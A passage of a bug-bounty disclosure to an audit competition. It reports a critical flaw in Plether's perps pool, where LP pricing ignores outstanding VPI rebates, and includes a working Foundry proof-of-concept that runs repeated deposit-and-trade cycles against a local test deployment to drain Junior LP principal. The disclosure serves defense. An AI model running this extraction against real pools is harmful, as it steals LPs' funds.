# \#100062 [SC-Critical] Attacker steals Junior LP principal by activating its deposit while its own open-time VPI rebate is outstanding

**Submitted on Nov 16th 2026 at 07:05:59 UTC by @Kirkeelee for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100062
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

LP share prices ignore VPI that the pool is certain to get back or pay back later. When a trader opens a position that reduces skew, the pool pays the VPI rebate in cash right away. The trader's lifetime-VPI clamp then guarantees the full rebate comes back when the position closes. Until that close, Junior is priced as if the cash were gone.

The rebate is computed at the current pool depth. So an attacker can do the following:

1. Make the pool deep with its own LP deposit.
2. Open a large skew cheaply from a second account.
3. Withdraw its LP, so depth shrinks while the skew stays.
4. Deposit to Junior again and open a skew-reducing position. The rebate is now large because depth is small, so the Junior price drops.
5. Let the deposit activate at that low price.
6. Close the position. The clawback restores the price, and the attacker's new shares capture most of the recovery.

Results:

- **Main PoC:** two cycles take Junior LPs' principal from 1,000,449.63 to 968,538.43 USDG on a 2M pool, about 1.6% per cycle.
- **Attacker profit:** +30,311.37 USDG net, after every fee and all carry, with no price movement.
- **No keeper race:** the attacker can open before the epoch boundary and let any unrelated keeper settle.

## Vulnerability Details

**1. The pool pays the open-time rebate in cash.**

```solidity
// libraries/CfdEnginePlanLib.sol:333
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
// CfdEngineSettlementSidecar.sol:442-443
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
```

The only limit on that payout is the open-solvency check: equity after the rebate must still cover max liability plus the buffer (`_applyOpenSettlementBufferAfterPlan`, CfdEnginePlanLib.sol:421 and 698-779). The rebate itself is computed at today's depth, `k·S²/(2D)`. A skew-reducing open is allowed even when S/D is above the 40% limit.

**2. The rebate is guaranteed to come back, so the open-depth/close-depth sandwich the clamp was written for is closed on the trader side only.** The trader must lock it in a non-withdrawable VPI reserve. On close, the clamp claws it back in full:

```solidity
// libraries/CloseAccountingLib.sol:112-117
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

**3. LP pricing does not count it.**

- `HousePoolAccountingLib.buildReconcileSnapshot` (HousePoolAccountingLib.sol:60-78) prices tranches as physical assets − trader claims + terminal price delta.
- The per-account cap of that terminal delta is `pnlPledgeAssets + traderClaimBalanceAssets` (TerminalNavBookV2.sol:433-434). The VPI reserve and accrued VPI are not included.

**4. Epoch settlement prices LP flows straight off that snapshot.**

- Deposits are priced at `juniorDepositPhase.pricingAssets = juniorPrincipal` (HousePool.sol:915).
- Redemptions are priced at `juniorPhase.pricingPrincipal = juniorPrincipal` (HousePool.sol:840).
- Both happen right after `_reconcile` in the same call.

**5. Nothing limits the attacker's share of the recovery.** Junior deposits are uncapped (`TrancheVault.maxRequestDeposit` returns `type(uint256).max` for Junior, TrancheVault.sol:1313-1326). A deposit activated during the dip receives almost all of the recovery when the clawback lands.

**The same mistake on the exit side.** A skew-increasing open pays a VPI charge into the pool, which raises the Junior price. The clamp lets that same position take the charge back as a rebate on close. So an attacker whose redemption is priced while such a charge is outstanding exits at an inflated price. The PoC also shows this leg.

## Attack steps

Pool: 1M Junior (victim) and 1M Senior, release stack and parameters, basket fixed at 1.20 the whole time.

1. **Deep pool.** Attacker account A deposits 8M into Junior, which activates at an ordinary epoch.
2. **Cheap skew.** Attacker account A2 opens a SHORT of 2.88M notional. The skew limit is 40% of the roughly 10M depth. The VPI charge is only 4,147 USDG because depth is large, and 8/9 of it accrues to A's own Junior shares.
3. **Shrink depth.** After the 1-hour cooldown, A redeems all 8M. The redemption is fully funded. Depth falls to about 2M while the 2.88M skew remains, so S/D ≈ 1.44.
4. **Request deposit.** A calls `requestDeposit(8M)` into Junior before the epoch cutoff.
5. **Open the dip.** Before the boundary (boundary − 2 minutes in the PoC variant), A opens a skew-reducing LONG of 1.80M notional. The pool pays a rebate of about 17,800 USDG and Junior equity falls from 1,000,441 to 982,626.
6. **Activate at the dip.** After the boundary, anyone calls `router.settleLpEpoch`. A's 8M activates at the low price.
7. **Clawback.** A closes the LONG. The clamp returns the full rebate to the pool.
8. **Exit.** After the cooldown, A redeems at the restored price.
9. **Repeat** steps 4-8. Finally, A2 closes its SHORT and gets its own VPI back through the clamp.

## Impact Details

`forge test --match-path test/scripts/VpiDipCycles.t.sol -vv`: 11/11 pass on a clean checkout of a82d4fef. All values in USDG.

**Main result (`test_M_maxExtraction_attackVsControl`, two dip cycles)**

| | Attacker net PnL (both accounts, all costs) | Victim Junior value change |
|---|---|---|
| Attack | **+30,311.37** | **−34,426.15** (1,000,449.63 → 968,538.43 across the two cycles) |
| Same flows without the dip legs | +1,302.97 | −2,537.38 |

- Per cycle, the victim drops 15,878 and then 16,033 USDG, about 1.6% of principal each time.
- **Unrelated keeper settles (`test_N_maxExtraction_unrelatedKeeperSettles`, one cycle):** the attacker opens at boundary − 2 minutes and `KEEPER` settles. Attacker +15,759.13; victim −18,406.32 (control −2,539.57).
- The "same flows" row is not neutral. A2's own skew VPI is paid while A is an LP and refunded after A has left, so that skew-and-depth timing alone already takes about 2.5k from the victim.

**Smaller variants in the same file**

| Variant | Attacker net PnL | Victim value change |
|---|---|---|
| 3 dip + exit-inflation cycles, attacker-made 720k skew, no third-party trader (`test_0_attackVsControl_selfSkew`) | +2,135.54 | −5,531.19 (control: −631.68 / +261.27) |
| Depth shrinks after an honest trader's skew, 1 dip cycle (`test_0_depthShrink_attackVsControl`) | +773.88 | −1,145.68 (control: +197.93 / +6.47) |

In the depth-shrink variant, the skew creator paid only 259.18 USDG of VPI in total, yet the victim loses 1,145.68 of principal.

**Repeatability and scale**

- The loss repeats every round trip, about 3 hours (activation, 1-hour cooldown, next epoch), using the same capital.
- It scales with pool size. The rebate is `k·(S_pre² − S_post²)/(2D)` with k = 0.01, and S/D can be pushed well above 0.4 by the depth-shrink step.
- **Attacker costs:** execution fees (paid to treasury), carry, and a few seconds of trading exposure per cycle. A2's skew position carries ordinary FX-basket exposure while it is open; it can be hedged off-protocol, and the extraction does not depend on price direction (the PoC holds the price constant to isolate the effect).

## Recommendation

Choose one:

- Count each open position's net accrued VPI in LP pricing (`buildReconcileSnapshot`): outstanding negative lifetime VPI (the reserved rebate) as a pool receivable, and positive accrued VPI as a pool payable.
- Defer deposit activation and redemption funding while VPI rebate reserves created since the last settlement are outstanding.

Separately, price rebates on the VPI actually paid into the pool, not on the current depth, so that shrinking depth cannot inflate them.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L333
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L443
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L698-L779
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L117
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L433-L434
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L840
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L915
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1313-L1326


## Proof of Concept

## Proof of Concept

Save as `test/scripts/VpiDipCycles.t.sol` in the repo root. Run with `forge test --match-path test/scripts/VpiDipCycles.t.sol -vv`. It deploys the stack with the repo's release script inside the test EVM; only Pyth and USDG are mocked.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {DeployPerpsArbitrumSepolia, MockUSDG} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {EmergencyPauseCoordinator} from "@plether/perps/EmergencyPauseCoordinator.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Mirrors the Arbitrum precompile's block-number view inside the local test EVM.
contract PoCArbSys {
    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }
}

/// @notice Same setup as the repo's test/scripts/MockUSDGPerpsLifecycle.t.sol: runs the release deploy script
/// (script/DeployPerpsArbitrumSepolia.s.sol, release parameters) inside the test EVM. Only Pyth and USDG are mocks.
/// Adds 1,000,000 USDG of Junior and 1,000,000 USDG of Senior liquidity through the normal async LP flow.
abstract contract ReleaseStackPoCBase is Test {
    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    address internal constant ARBSYS = address(100);
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    /// @dev Monday 2024-03-04 10:00 UTC (FX market open, no FAD window) — same anchor as the repo tests.
    uint256 internal constant MONDAY_MORNING = 1_709_532_000;
    uint256 internal constant CAP_PRICE = 2e8;
    uint256 internal constant START_PRICE = 120_000_000; // basket mark 1.20 (8 decimals)
    uint256 internal constant SIZE_QUANTUM = 100e18; // positionSizeQuantum = 1e20 raw units
    uint256 internal constant JUNIOR_LP_ASSETS = 1_000_000e6;
    uint256 internal constant SENIOR_LP_ASSETS = 1_000_000e6;
    uint8 internal constant MODE_LIVE = 1; // allowedExecutionModes bit for ExecutionMode.Live (1 << (Live-1))
    uint8 internal constant MODES_ALL = 7; // Live | Fad | Frozen

    DeployPerpsArbitrumSepolia.DeployedContracts internal stack;
    MockUSDG internal usdg;
    CfdEngine internal engine;
    HousePool internal pool;
    TrancheVault internal seniorVault;
    TrancheVault internal juniorVault;
    MarginClearinghouse internal clearinghouse;
    OrderRouter internal router;
    OrderLifecycleBook internal lifecycleBook;
    TerminalNavBookV2 internal navBook;
    EmergencyPauseCoordinator internal coordinator;
    PletherOracle internal oracle;
    MockPyth internal pyth;

    /// Trusted roles: OWNER (deployer, owner of every perps contract) and GUARDIAN.
    address internal OWNER;
    address internal GUARDIAN;
    /// Untrusted actors (anyone can be a keeper).
    address internal KEEPER;
    address internal JUNIOR_LP;
    address internal SENIOR_LP;

    uint256 internal currentBasketPrice;
    uint256 internal _clientNonce;

    function setUp() public virtual {
        vm.chainId(421_614);
        vm.warp(MONDAY_MORNING);
        vm.etch(ARBSYS, address(new PoCArbSys()).code);
        vm.etch(RELEASE_PYTH, address(new MockPyth()).code);
        pyth = MockPyth(RELEASE_PYTH);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        stack = DeployPerpsArbitrumSepolia(
            deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")
        ).run();

        usdg = stack.settlementToken;
        engine = stack.engine;
        pool = stack.housePool;
        seniorVault = stack.seniorVault;
        juniorVault = stack.juniorVault;
        clearinghouse = stack.clearinghouse;
        router = stack.router;
        lifecycleBook = stack.lifecycleBook;
        navBook = stack.terminalNavBook;
        coordinator = stack.emergencyPauseCoordinator;
        oracle = PletherOracle(stack.pletherOracle);

        OWNER = vm.addr(DEPLOYER_KEY);
        GUARDIAN = makeAddr("guardian");
        KEEPER = makeAddr("keeper");
        JUNIOR_LP = makeAddr("juniorLP");
        SENIOR_LP = makeAddr("seniorLP");
        vm.label(OWNER, "OWNER");

        // Production bootstrap (DEPLOYMENT.md): guardian set, 1 USDG permanent seed per tranche, trading activated.
        vm.startPrank(OWNER);
        coordinator.setGuardian(GUARDIAN);
        usdg.mint(OWNER, 2e6);
        usdg.approve(address(pool), 2e6);
        pool.initializeSeedPosition(false, 1e6, OWNER);
        pool.initializeSeedPosition(true, 1e6, OWNER);
        pool.activateTrading();
        vm.stopPrank();

        _setBasketPrice(START_PRICE);
        router.updateMarkPrice(_updateData());

        // Ordinary LP liquidity through the async epoch flow (Junior first, then Senior), like the v2.0.0 testnet.
        _lpDeposit(juniorVault, JUNIOR_LP, JUNIOR_LP_ASSETS);
        _lpDeposit(seniorVault, SENIOR_LP, SENIOR_LP_ASSETS);
    }

    // ------------------------------------------------------------------ oracle -----------------------------------
    /// @notice Moves every release feed by the same normalized factor so the basket mark becomes `basketPrice`
    /// (8 decimals), publishTime = now. Inverse FX feeds keep their own units. Does NOT push it on-chain: pass
    /// `_updateData()` to a Router call (executeOrder / updateMarkPrice / settleLpEpoch / liquidation).
    function _setBasketPrice(uint256 basketPrice) internal {
        _setBasketPriceAt(basketPrice, vm.getBlockTimestamp());
    }

    function _setBasketPriceAt(uint256 basketPrice, uint256 publishTime) internal {
        currentBasketPrice = basketPrice;
        for (uint256 i; i < 6; ++i) {
            uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
            uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
            pyth.setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), int32(-8), publishTime);
        }
    }

    /// @dev Non-encoded payload: MockPyth answers with the individually configured feed prices.
    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _pushMark(uint256 basketPrice) internal {
        _setBasketPrice(basketPrice);
        vm.prank(KEEPER);
        router.updateMarkPrice(_updateData());
    }

    // ------------------------------------------------------------------ LPs --------------------------------------
    /// @notice requestDeposit -> warp to the target epoch -> keeper settles via Router (atomic oracle refresh) -> claim.
    function _lpDeposit(TrancheVault vault, address lp, uint256 assets) internal returns (uint256 shares) {
        usdg.mint(lp, assets);
        vm.startPrank(lp);
        usdg.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _settleEpoch(requestId);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, assets, lp, lp);
    }

    /// @notice requestRedeem (after the deposit cooldown) -> settle the target epoch -> returns requestId (claim it
    /// yourself with vault.claimRedeem(requestId, shares, lp, lp)).
    function _lpRequestRedeemAndSettle(TrancheVault vault, address lp, uint256 shares)
        internal
        returns (uint256 requestId)
    {
        uint256 cooldownEnd = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) vm.warp(cooldownEnd);
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
        _settleEpoch(requestId);
    }

    function _settleEpoch(uint256 epochId) internal {
        uint256 start = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < start) vm.warp(start);
        vm.roll(vm.getBlockNumber() + 1);
        _setBasketPrice(currentBasketPrice);
        vm.prank(KEEPER);
        router.settleLpEpoch(_updateData());
    }

    // ------------------------------------------------------------------ traders ----------------------------------
    function _fundTrader(address trader, uint256 assets) internal {
        usdg.mint(trader, assets);
        vm.startPrank(trader);
        usdg.approve(address(clearinghouse), assets);
        clearinghouse.depositMargin(assets);
        vm.stopPrank();
    }

    /// @notice Permissive bounds (live mode only by default); tighten fields in your own request if the test needs to.
    function _bounds(uint256 maxPostSize) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: MODE_LIVE,
            expectedConfigHash: lifecycleBook.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint128).max,
            maxExecutionNotionalAssets: type(uint128).max,
            maxGrossAccountDebitAssets: type(uint128).max,
            maxActionChargeAssets: type(uint128).max,
            maxExplicitFeesAssets: type(uint128).max,
            maxPostPositionSize: maxPostSize,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev LONG gains when the basket falls: an opening LONG accepts any fill >= targetPrice, a closing LONG any
    /// fill <= targetPrice (and the reverse for SHORT). Permissive targets: 1 / CAP_PRICE.
    function _permissiveTarget(CfdTypes.Side side, bool isClose) internal pure returns (uint256) {
        bool wantsHigh = (side == CfdTypes.Side.LONG) != isClose;
        return wantsHigh ? 1 : CAP_PRICE;
    }

    function _commit(address trader, CfdTypes.Side side, uint256 sizeDelta, uint256 marginDelta, bool isClose)
        internal
        returns (uint64 orderId)
    {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("poc", trader, ++_clientNonce));
        request.side = side;
        request.sizeDelta = sizeDelta;
        request.marginDelta = marginDelta;
        request.targetPrice = _permissiveTarget(side, isClose);
        request.isClose = isClose;
        request.bounds = _bounds(isClose ? type(uint128).max : type(uint128).max);
        vm.prank(trader);
        orderId = router.commitOrder(request);
    }

    /// @notice Keeper executes `orderId` at basket price `fillPrice` after the minimum delay (7 s, 2 blocks).
    function _execute(uint64 orderId, uint256 fillPrice) internal returns (OrderV3Types.ExecutionResult memory r) {
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrice(fillPrice);
        vm.prank(KEEPER);
        r = router.executeOrder(orderId, _updateData());
    }

    function _open(address trader, CfdTypes.Side side, uint256 size, uint256 margin, uint256 fillPrice)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        r = _execute(_commit(trader, side, size, margin, false), fillPrice);
    }

    function _close(address trader, CfdTypes.Side side, uint256 size, uint256 fillPrice)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        r = _execute(_commit(trader, side, size, 0, true), fillPrice);
    }

    function _positionSize(address trader) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(trader);
    }

    function _assertExecuted(OrderV3Types.ExecutionResult memory r, string memory what) internal pure {
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), what);
    }
}

contract VpiDipCycles is ReleaseStackPoCBase {
    address internal W = makeAddr("honestWhale");
    address internal A = makeAddr("attackerLpTraderKeeper");
    address internal A2 = makeAddr("attackerSkewAccount");

    uint256 internal constant SKEW_SIZE = 600_000e18; // 720k notional at 1.20
    uint256 internal constant INFLATE_SIZE = 900_000e18; // 1.08M notional skew-increasing leg before exit
    uint256 internal constant DEP = 8_000_000e6;

    function _juniorEquity() internal view returns (uint256 j) {
        (, j,,) = pool.getPendingTrancheState();
    }

    function _valueOf(address lp) internal view returns (uint256) {
        return _juniorEquity() * juniorVault.balanceOf(lp) / juniorVault.totalSupply();
    }

    function _bal(address a) internal view returns (uint256) {
        return clearinghouse.getAccountAssetBuckets(a).settlementBalanceAssets;
    }

    function _wealth(address a) internal view returns (uint256) {
        return usdg.balanceOf(a) + _bal(a);
    }

    function _toBoundary(uint256 epochId) internal {
        uint256 b = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < b + 1) vm.warp(b + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _setBasketPrice(START_PRICE);
    }

    function _settleAsA() internal {
        vm.roll(vm.getBlockNumber() + 1);
        _setBasketPrice(START_PRICE);
        vm.prank(A);
        router.settleLpEpoch(_updateData());
    }

    /// One full LP round trip of `DEP` by the attacker. dip: skew-reducing SHORT around deposit activation.
    /// inflate: skew-increasing LONG around redemption pricing.
    function _cycle(bool dip, bool inflate) internal {
        vm.startPrank(A);
        usdg.approve(address(juniorVault), DEP);
        uint256 depId = juniorVault.requestDeposit(DEP, A, A);
        vm.stopPrank();
        _toBoundary(depId);
        if (dip) _assertExecuted(_open(A, CfdTypes.Side.SHORT, SKEW_SIZE, 20_000e6, START_PRICE), "dip open");
        _settleAsA();
        vm.prank(A);
        uint256 shares = juniorVault.claimDeposit(depId, DEP, A, A);
        if (dip) _assertExecuted(_close(A, CfdTypes.Side.SHORT, _positionSize(A), START_PRICE), "dip close");

        vm.warp(juniorVault.lastDepositTime(A) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(A);
        uint256 redId = juniorVault.requestRedeem(shares, A, A);
        _toBoundary(redId);
        if (inflate) {
            _assertExecuted(_open(A, CfdTypes.Side.LONG, INFLATE_SIZE, 20_000e6, START_PRICE), "inflate open");
        }
        _settleAsA();
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, A);
        require(claimable == shares, "redemption not fully funded");
        vm.prank(A);
        juniorVault.claimRedeem(redId, claimable, A, A);
        if (inflate) {
            _assertExecuted(_close(A, CfdTypes.Side.LONG, _positionSize(A), START_PRICE), "inflate close");
        }
        _pushMark(START_PRICE);
    }

    function _runCycles(uint256 n, bool dip, bool inflate, bool selfSkew)
        internal
        returns (int256 attackerPnl, int256 victimDelta)
    {
        address skewer = selfSkew ? A2 : W;
        _fundTrader(skewer, 100_000e6);
        _fundTrader(A, 100_000e6);
        usdg.mint(A, DEP + 100_000e6);
        uint256 wealth0 = _wealth(A) + (selfSkew ? _wealth(A2) : 0);
        _pushMark(START_PRICE);
        uint256 victim0 = _valueOf(JUNIOR_LP);
        _assertExecuted(_open(skewer, CfdTypes.Side.LONG, SKEW_SIZE, 20_000e6, START_PRICE), "skew open");
        _pushMark(START_PRICE);
        console2.log("victim value gain from skew-creator VPI", _valueOf(JUNIOR_LP) - victim0);
        for (uint256 i; i < n; ++i) {
            _cycle(dip, inflate);
            console2.log("after cycle, attacker wealth", _wealth(A));
        }
        if (selfSkew) {
            _assertExecuted(_close(A2, CfdTypes.Side.LONG, _positionSize(A2), START_PRICE), "skew close");
            _pushMark(START_PRICE);
        }
        attackerPnl = int256(_wealth(A) + (selfSkew ? _wealth(A2) : 0)) - int256(wealth0);
        victimDelta = int256(_valueOf(JUNIOR_LP)) - int256(victim0);
    }

    function _report(string memory tag, int256 pnl, int256 victim) internal pure {
        console2.log(tag);
        console2.log("  attacker net pnl (USDG atoms)", pnl);
        console2.log("  victim Junior value change   ", victim);
    }

    // ---- honest whale skew, 3 cycles
    function test_1_control_3cycles() public { (int256 p, int256 v) = _runCycles(3, false, false, false); _report("CONTROL 3 cycles (no trades)", p, v); }
    function test_2_dipOnly_3cycles() public { (int256 p, int256 v) = _runCycles(3, true, false, false); _report("DIP 3 cycles", p, v); }
    function test_3_dipAndInflate_3cycles() public { (int256 p, int256 v) = _runCycles(3, true, true, false); _report("DIP+INFLATE 3 cycles", p, v); }
    // ---- attacker creates the skew itself from a second account (no honest whale)
    function test_4_selfSkew_control() public { (int256 p, int256 v) = _runCycles(3, false, false, true); _report("SELF-SKEW CONTROL", p, v); }
    function test_5_selfSkew_dipAndInflate() public { (int256 p, int256 v) = _runCycles(3, true, true, true); _report("SELF-SKEW DIP+INFLATE", p, v); }

    /// Depth shrinks after the skew is created: W pays VPI at D ~ 10M, then the large LP leaves (D ~ 2M), so the
    /// attacker's rebate (computed at the small depth) exceeds the VPI W ever paid into the pool.
    function _depthShrink(bool dip) internal returns (int256 attackerPnl, int256 victimDelta) {
        _fundTrader(W, 100_000e6);
        _fundTrader(A, 100_000e6);
        usdg.mint(A, DEP + 100_000e6);
        uint256 wealth0 = _wealth(A);
        _pushMark(START_PRICE);
        uint256 victim0 = _valueOf(JUNIOR_LP);
        vm.startPrank(A);
        usdg.approve(address(juniorVault), DEP);
        uint256 depId = juniorVault.requestDeposit(DEP, A, A);
        vm.stopPrank();
        _toBoundary(depId);
        _settleAsA();
        vm.prank(A);
        uint256 shares = juniorVault.claimDeposit(depId, DEP, A, A);
        uint256 lpBefore = _juniorEquity();
        _assertExecuted(_open(W, CfdTypes.Side.LONG, SKEW_SIZE, 20_000e6, START_PRICE), "skew open");
        _pushMark(START_PRICE);
        console2.log("total VPI W paid into Junior (deep pool)", _juniorEquity() - lpBefore);
        console2.log("  of which victim share                ", _valueOf(JUNIOR_LP) - victim0);
        vm.warp(juniorVault.lastDepositTime(A) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(A);
        uint256 redId = juniorVault.requestRedeem(shares, A, A);
        _toBoundary(redId);
        _settleAsA();
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, A);
        vm.prank(A);
        juniorVault.claimRedeem(redId, claimable, A, A);
        _pushMark(START_PRICE);
        _cycle(dip, false);
        attackerPnl = int256(_wealth(A)) - int256(wealth0);
        victimDelta = int256(_valueOf(JUNIOR_LP)) - int256(victim0);
    }

    function test_6_depthShrink_control() public { (int256 p, int256 v) = _depthShrink(false); _report("DEPTH-SHRINK CONTROL", p, v); }
    function test_7_depthShrink_dip() public { (int256 p, int256 v) = _depthShrink(true); _report("DEPTH-SHRINK DIP", p, v); }

    /// Headline check: no honest trader at all. The attacker creates the skew from its own second account, runs three
    /// LP round trips (dip at activation + inflation at redemption pricing), then closes the skew account.
    function test_0_attackVsControl_selfSkew() public {
        uint256 snap = vm.snapshotState();
        (int256 pAttack, int256 vAttack) = _runCycles(3, true, true, true);
        vm.revertToState(snap);
        (int256 pControl, int256 vControl) = _runCycles(3, false, false, true);
        _report("ATTACK (self-skew, 3 cycles)", pAttack, vAttack);
        _report("CONTROL (same flows, no dip/inflate legs)", pControl, vControl);
        assertGt(pAttack, 0, "attacker profits in absolute terms");
        assertLt(vAttack, 0, "victim Junior LP ends below its starting value (principal loss)");
        assertGt(vControl, 0, "without the legs the victim gains");
    }

    /// Principal variant: the rebate is priced at today's (smaller) depth, far above the VPI the skew creator paid.
    function test_0_depthShrink_attackVsControl() public {
        uint256 snap = vm.snapshotState();
        (int256 pAttack, int256 vAttack) = _depthShrink(true);
        vm.revertToState(snap);
        (int256 pControl, int256 vControl) = _depthShrink(false);
        _report("ATTACK depth-shrink", pAttack, vAttack);
        _report("CONTROL depth-shrink", pControl, vControl);
        assertGt(pAttack, pControl);
        assertLt(vAttack, 0, "victim loses principal");
    }

    // ------------------------------------------------------------------ max extraction ---------------------------
    uint256 internal constant MAX_SKEW_SIZE = 2_400_000e18; // 2.88M notional SHORT (0.4 * ~10M deep depth allows it)
    uint256 internal constant DIP_LONG_SIZE = 1_500_000e18; // 1.80M notional skew-reducing LONG at ~2M depth

    /// Dip leg with a parametrised position. `early`: the attacker opens before the epoch boundary and an unrelated
    /// keeper settles after it (no keeper race needed).
    function _dipCycleSized(CfdTypes.Side side, uint256 size, bool dip, bool early) internal {
        vm.startPrank(A);
        usdg.approve(address(juniorVault), DEP);
        uint256 depId = juniorVault.requestDeposit(DEP, A, A);
        vm.stopPrank();
        uint256 b = pool.lpEpochStart(depId);
        if (early) {
            vm.warp(b - 120);
            vm.roll(vm.getBlockNumber() + 1);
            if (dip) _assertExecuted(_open(A, side, size, 100_000e6, START_PRICE), "dip open (pre-boundary)");
            _pushMark(START_PRICE);
            console2.log("junior equity at dip (pre-boundary)", _juniorEquity());
            vm.warp(b + 1);
            vm.roll(vm.getBlockNumber() + 1);
            _setBasketPrice(START_PRICE);
            vm.prank(KEEPER); // unrelated keeper
            router.settleLpEpoch(_updateData());
        } else {
            _toBoundary(depId);
            if (dip) _assertExecuted(_open(A, side, size, 100_000e6, START_PRICE), "dip open");
            _pushMark(START_PRICE);
            console2.log("junior equity at dip", _juniorEquity());
            _settleAsA();
        }
        vm.prank(A);
        uint256 shares = juniorVault.claimDeposit(depId, DEP, A, A);
        if (dip) _assertExecuted(_close(A, side, _positionSize(A), START_PRICE), "dip close");
        _pushMark(START_PRICE);
        console2.log("junior equity after close", _juniorEquity());
        vm.warp(juniorVault.lastDepositTime(A) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(A);
        uint256 redId = juniorVault.requestRedeem(shares, A, A);
        _toBoundary(redId);
        _settleAsA();
        uint256 claimable = juniorVault.claimableRedeemRequest(redId, A);
        require(claimable == shares, "redemption not fully funded");
        vm.prank(A);
        juniorVault.claimRedeem(redId, claimable, A, A);
        _pushMark(START_PRICE);
    }

    /// 1) attacker LP makes the pool deep, 2) attacker's second account opens max skew cheaply at deep depth,
    /// 3) attacker LP leaves (depth shrinks, skew stays), 4) `cycles` dip round trips, 5) skew account closes.
    function _maxExtraction(uint256 cycles, bool dip, bool early) internal returns (int256 attackerPnl, int256 victimDelta) {
        _fundTrader(A2, 200_000e6);
        _fundTrader(A, 200_000e6);
        usdg.mint(A, DEP + 100_000e6);
        uint256 wealth0 = _wealth(A) + _wealth(A2);
        _pushMark(START_PRICE);
